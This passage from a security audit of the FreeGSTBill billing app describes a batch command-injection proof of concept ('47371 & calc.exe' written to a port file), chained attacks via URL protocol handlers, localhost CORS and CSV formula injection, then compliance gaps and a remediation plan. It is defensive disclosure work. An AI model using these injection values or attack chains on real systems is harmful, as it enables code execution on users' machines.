1. **Injection:** A local process writes `47371 & calc.exe` into `data\port.txt`.
2. **Trigger:** The user or a browser navigation to `freegstbill-stop://` executes `Stop FreeGSTBill.bat`.
3. **Evaluation:** The batch loop `for /f ... in ('netstat -ano ^| findstr :%PORT% ...')` runs inside an implicit `cmd /c` subshell.
4. **Execution:** `%PORT%` expands textually, causing the CMD interpreter to parse `&` as a command delimiter and execute `calc.exe` with user privileges.

---

## 14. Compound Exploitation & Multi-Vector Kill Chains

Adversarial analysis verified how individual weaknesses can be chained into multi-stage attack scenarios:

### Compound Chain A: Zero-Click Web-to-RCE Kill Chain
- **Building Blocks:** VULN-HIGH-02 (URL Protocol Handler) + VULN-CRIT-02 (Unsigned GitHub ZIP Updater) + VULN-MED-05 (Postinstall Lifecycle Hook).
- **Execution:** A victim browses to a compromised website containing `<iframe src="freegstbill-update://run">`. The browser invokes Windows ShellExecute to run `Update FreeGSTBill.bat`. The script pulls the latest zipball from GitHub without cryptographic signature verification, overwrites application files, and executes `npm install`, achieving full remote code execution without user interaction.

### Compound Chain B: Cross-Origin Administrative Host Control
- **Building Blocks:** VULN-HIGH-03 (Wildcard-Port Localhost CORS) + VULN-CRIT-01 (Unauthenticated Control Panel Process Execution).
- **Execution:** A malicious script running on another local port (e.g. dev server at `localhost:3000`) issues a cross-origin `POST` request to `/api/control-panel/launch-script` with `{ "action": "update" }`. FreeGSTBill's CORS middleware permits the request. The server immediately launches `powershell.exe -ExecutionPolicy Bypass -File update-windows.ps1`.

### Compound Chain C: Downstream Accounting Firm Compromise
- **Building Blocks:** VULN-HIGH-01 (Unauthenticated API) + VULN-HIGH-03 (Localhost CORS) + VULN-MED-01 (CSV Formula Injection).
- **Execution:** An attacker on a local network or local port injects a fraudulent supplier invoice containing an Excel formula payload. At the end of the financial quarter, the business owner downloads the GSTR-1 CSV report and emails it to their Chartered Accountant (CA). When the CA opens the spreadsheet in Microsoft Excel, the formula executes, compromising the CA firm's workstation and exposing other clients' confidential tax filings.

---

## 15. Security Strengths & Existing Defensive Controls

The audit identified several positive security design practices implemented by the developer:
1. **Loopback Interface Binding:** `server.js:1367` strictly binds the Express listener to `127.0.0.1` rather than `0.0.0.0`, preventing direct inbound exploitation across local area networks (LAN) or public interfaces.
2. **Atomic Filesystem Writes:** In `server.js:140-205`, `writeFileAtomic` writes data to temporary staging files (`.tmp`) followed by synchronous `fs.renameSync` operations, preventing database corruption during sudden power failures or system crashes.
3. **Client-Side DOM Sanitization:** Frontend rendering of rich-text invoice terms, notes, and custom templates uses `DOMPurify.sanitize()` (`src/components/InvoicePreview.jsx:1195, 1205`), mitigating stored Cross-Site Scripting (XSS).
4. **Soft-Deletion Staging:** Destructive invoice deletions default to moving files into `data/trash/` rather than immediate unlinking (`server.js:289-291`), protecting businesses against accidental data loss.
5. **Path Traversal Guards on PDF Exports:** `server.js:98-116` implements `safePathSegment` and `isPathInside` specifically to prevent directory traversal attacks during PDF export generation.
6. **Zero-Knowledge Cloud Architecture:** Google Drive integration (`src/services/googleDrive.js`) operates entirely client-side; user OAuth tokens and backup files are transmitted directly from the browser to Google APIs without traversing intermediate backend servers.

---

## 16. Regulatory & Privacy Compliance (Indian Legal Framework)

### 16.1 Digital Personal Data Protection (DPDP) Act 2023 Assessment

| Section / Principle | Requirement | Technical Status | Identified Gap & Evidence |
|---|---|:---:|---|
| **Section 6 (Consent & Notice)** | Clear, transparent notice and verifiable consent before collecting personal data. | **Partially Implemented** | Application collects customer names, phone numbers, and addresses without privacy notice or consent state tracking in `profile.json` or client forms. |
| **Section 7 (Data Minimization)** | Collect only data necessary for specified billing and GST compliance purposes. | **Implemented** | Data collected is aligned with statutory GST invoicing requirements under Rule 46 of CGST Rules 2017. |
| **Section 8(4) (Reasonable Security Safeguards)** | Data Fiduciaries must implement reasonable technical safeguards to protect personal data from breach. | **FAILED (Critical Gap)** | Plaintext storage of PAN, GSTIN, bank accounts, and invoice ledgers in `data/*.json` and `localStorage` (VULN-MED-06), combined with complete lack of API authentication (VULN-HIGH-01), violates reasonable security requirements. |
| **Section 8(6) (Data Breach Notification)** | Obligation to notify the Data Protection Board of India and affected data principals upon breach. | **Not Implemented** | No audit logging, security incident monitoring, or breach notification mechanisms exist in the application. |
| **Section 12 (Right to Erasure)** | Data principals have the right to request erasure of their personal data. | **Partially Implemented** | Soft delete and permanent delete are supported for bills and clients, but orphaned records remain in `data/trash/`, backups, and browser Service Worker cache. |

### 16.2 CERT-In Cyber Security Directions (No. 20(3)/2022-CERT-In)
- **Mandatory Log Retention (Direction 2(v)):** Requires system logs to be maintained for 180 days within Indian jurisdiction. FreeGSTBill only logs runtime uncaught exceptions to `data/errors.log` (`server.js:1270-1304`) and performs zero security event logging (login, data access, exports).
- **Time Synchronization (Direction 2(i)):** System timestamps rely on local host clocks without NTP verification.
- **Incident Reporting Window (Direction 2(vi)):** System does not maintain audit trails necessary to report cybersecurity incidents within the mandatory 6-hour window.

### 16.3 Tax & GST Data Confidentiality Mandates
Under Section 158 of the Central Goods and Services Tax (CGST) Act 2017, returns, invoices, and payment data are confidential business information. Exposing invoice ledgers to unauthorized local processes via unauthenticated endpoints (`GET /api/export`) breaches commercial confidentiality requirements.

---

## 17. Prioritized Remediation Plan

The remediation plan is organized into three prioritized phases based on CVSS severity, exploitability, and operational impact:

| Phase | Finding ID | Vulnerability Title | Target Files | Remediation Action |
|:---:|---|---|---|---|
| **P0: Immediate (0 – 48 Hours)** | **VULN-CRIT-01** | Unauthenticated Process Execution | `server.js:845-888, 951-959` | Generate random 256-bit token on boot, store in user-locked file, mandate `X-Auth-Token` on control-panel endpoints, remove `-ExecutionPolicy Bypass`. |
| **P0: Immediate (0 – 48 Hours)** | **VULN-HIGH-02** | Web-to-Host Batch Execution | `Install FreeGSTBill.bat:272-284` | Deregister all custom URL protocol handlers (`freegstbill://`, `freegstbill-update://`, `freegstbill-stop://`) from Windows registry. |
| **P0: Immediate (0 – 48 Hours)** | **VULN-HIGH-04** | Subshell Command Injection in Batch | `Stop FreeGSTBill.bat:10-15`, `Update FreeGSTBill.bat:31-36` | Strictly validate `%PORT%` to assert decimal digits (`^[0-9]+$`) before expanding inside `for /f ('...')`. |
| **P0: Immediate (0 – 48 Hours)** | **VULN-MED-05** | Bogus Hash in Postinstall | `scripts/bundle-tesseract-assets.mjs:74-77` | Hardcode expected SHA-256 digest of `eng.traineddata`, assert `sha === EXPECTED`, pin URL to immutable commit hash. |
| **P1: Short Term (1 – 2 Weeks)** | **VULN-CRIT-02** | Unsigned GitHub Auto-Update | `Update FreeGSTBill.bat:50-74`, `update-windows.ps1:40-97` | Implement GPG or Authenticode digital signature verification before extracting release archives; pin releases to manifest hashes. |
| **P1: Short Term (1 – 2 Weeks)** | **VULN-HIGH-01** | Absence of API Authentication | `server.js:54-1255`, `src/store.js` | Enforce `X-Auth-Token` across all 54 Express routes; update frontend `apiFetch` to pass header. |
| **P1: Short Term (1 – 2 Weeks)** | **VULN-HIGH-03** | Wildcard Localhost CORS | `server.js:54-72` | Restrict CORS origin strictly to `req.socket.localPort` rather than regex `(:\d+)?`. |
| **P1: Short Term (1 – 2 Weeks)** | **VULN-HIGH-05** | Missing Anti-CSRF Defenses | `server.js:54-72, 217-301` | Enforce custom header requirement (`X-Requested-With`) on all mutating (`POST`, `PUT`, `DELETE`) routes. |
| **P1: Short Term (1 – 2 Weeks)** | **VULN-HIGH-06** | Unquoted Registry Command | `Install FreeGSTBill.bat:173, 273` | Enclose registry command values in escaped double quotes: `-Value '\"%TARGET_PATH%\" \"%1\"'`. |
| **P1: Short Term (1 – 2 Weeks)** | **VULN-HIGH-07** | Unverified Silent MSI Download | `install-windows.ps1:27-32` | Verify Node.js MSI SHA-256 hash and Authenticode signature before calling `msiexec.exe`. |
| **P1: Short Term (1 – 2 Weeks)** | **VULN-MED-01** | CSV Formula Injection | `src/components/GSTReturns.jsx:19-27` | Neutralize formula characters (`=`, `+`, `-`, `@`, `|`, `\t`, `\r`) by prepending a single quote `'` in CSV exports. |
| **P1: Short Term (1 – 2 Weeks)** | **VULN-MED-02** | Metadata Prototype Pollution | `server.js:526-531` | Filter forbidden keys (`__proto__`, `constructor`, `toString`, `valueOf`) on `POST /api/meta/:key`. |
| **P1: Short Term (1 – 2 Weeks)** | **VULN-MED-03** | Reserved DOS Device Names | `server.js:88-90, 220` | Sanitize DOS device names (`CON`, `PRN`, `AUX`, `NUL`) and enforce `isPathInside` across all entity writes. |
| **P1: Short Term (1 – 2 Weeks)** | **VULN-MED-04** | Zip Slip in Restoration | `restore-windows.ps1:37-41` | Validate archive entry paths before extraction using `[System.IO.Compression.ZipFile]::OpenRead()`. |
| **P2: Long Term (1 – 2 Months)** | **VULN-MED-06** | Plaintext Storage at Rest | `data/`, `Update FreeGSTBill.bat` | Implement AES-256-GCM encryption for stored JSON records in `data/`; avoid world-readable `%TEMP%` staging. |
| **P2: Long Term (1 – 2 Months)** | **VULN-MED-07** | Covert Persistence Daemon | `Install FreeGSTBill.bat:239-265` | Make startup auto-launch an explicit opt-in setting in UI; add visible system tray icon. |
| **P2: Long Term (1 – 2 Months)** | **VULN-LOW-01** | Missing Security Headers | `server.js:43-73` | Integrate `helmet` middleware in `server.js` (`X-Content-Type-Options`, `X-Frame-Options`). |
| **P2: Long Term (1 – 2 Months)** | **VULN-LOW-02** | Large Payload DoS | `server.js:217, 568, 670` | Enforce disk storage quotas and add `express-rate-limit` to upload routes. |
| **P2: Long Term (1 – 2 Months)** | **VULN-LOW-03** | Indiscriminate Process Kill | `Stop FreeGSTBill.bat:10-15` | Validate process executable name (`node.exe`) before terminating PIDs. |
| **P2: Long Term (1 – 2 Months)** | **VULN-LOW-04** | Service Worker Financial Cache | `vite.config.js:177-196` | Exclude `/api/bills` and `/api/export` from Workbox Service Worker caching. |
| **P2: Long Term (1 – 2 Months)** | **VULN-INFO-01** | Missing CI/CD Pipeline | `.github/` | Add GitHub Actions workflow for automated testing, ESLint, and CodeQL SAST scanning. |
| **P2: Long Term (1 – 2 Months)** | **VULN-INFO-02** | Zombie Dependency | `package.json:97` | Prune unused `cors` dependency via `npm uninstall cors`. |

---

## 18. Final Malicious Maintainer Hypothesis Review & Audit Limitations

### 18.1 Malicious Maintainer Hypothesis Review
An adversarial heuristic evaluation was conducted to determine whether any of the severe architectural vulnerabilities were deliberately engineered as covert backdoors.

#### The Adversarial Case for Intentional Backdoors (Suspicious Heuristics):
1. **Misleading Integrity Comments:** In `scripts/bundle-tesseract-assets.mjs:32`, code comments state that SHA-256 is verified to guard against silent corruption, yet lines 75-76 merely log the hash without asserting it.
2. **Execution Policy Bypass:** `server.js:875`, `Free GST Billing.hta:160`, and `Install FreeGSTBill.bat:273` consistently pass `-ExecutionPolicy Bypass` to PowerShell.
3. **Covert Daemon Execution:** `Install FreeGSTBill.bat` automatically configures a Windows Startup shortcut launching `node server.js` via `powershell -WindowStyle Hidden` without a system tray presence.
4. **Direct GitHub Branch Updates:** `Update FreeGSTBill.bat` pulls raw `main.zip` from GitHub and unpacks it directly over existing files.

#### The Technical Case Against Intentional Backdoors (Honest Developer Context):
1. **Friction Reduction for Non-Technical Users:** Developer notes in `index.html:175-220` and `Install FreeGSTBill.bat` explain that Indian retail shopkeepers experienced severe confusion over server management and port collisions. Custom URL protocols (`freegstbill://`, `freegstbill-stop://`) were introduced so HTML buttons could start and stop local background services without requiring a heavy Electron framework.
2. **Evidence of Defensive Iteration in Git History:**
   * In `server.js:45`, comments document that earlier versions used permissive `cors()` (wildcard `*`). The developer intentionally wrote custom middleware to lock origins down to `localhost`. A malicious author seeking a backdoor would not have restricted CORS to loopback origins.
   * In `server.js:98-116`, the developer implemented `safePathSegment` and `isPathInside` specifically to prevent path traversal on PDF exports.
   * In `server.js:140-205`, the developer built `writeFileAtomic` to protect against database corruption during frequent power outages in regional India.
3. **Absence of Obfuscation, Beacons, or Hidden Credentials:** Static analysis confirms zero packed code, zero `eval` calls, zero C2 beacons, and zero hardcoded administrative accounts.
4. **"Logging as Verification" Anti-Pattern:** The developer implemented a minimum file size check (`TRAINEDDATA_MIN_BYTES = 3_000_000`) to catch HTTP error redirects and logged the SHA-256 for manual console inspection. This reflects an inexperienced developer anti-pattern rather than an intentional backdoor.

**Conclusion:** **NO EVIDENCE OF MALICIOUS MAINTAINER SABOTAGE.** The vulnerabilities represent severe architectural and operational security deficits resulting from prioritizing usability over multi-user boundary security.

### 18.2 Audit Boundaries & Limitations
1. **Read-Only Inspection Mode:** In strict compliance with audit rules, no live weaponized exploit payloads were executed against external infrastructure, nor were local system files modified or deleted.
2. **Platform Context:** Batch script behaviors and Windows registry protocol registrations were evaluated against Windows 10/11 Win32 and ShellExecute specifications.
3. **Airgapped Networks:** In fully offline or airgapped workstations without internet connectivity, remote update vectors (VULN-CRIT-02, VULN-MED-05) cannot reach external hosts at runtime, though the underlying code defects remain present.
4. **Non-Substitutability for Independent Certification:** This technical code audit does not substitute for formal organizational DPDP Act compliance certification or independent ISO 27001 / CERT-In empanelled audit attestation.

---
*Report compiled and verified by Master Security Audit Team. All findings verified against repository source code.*
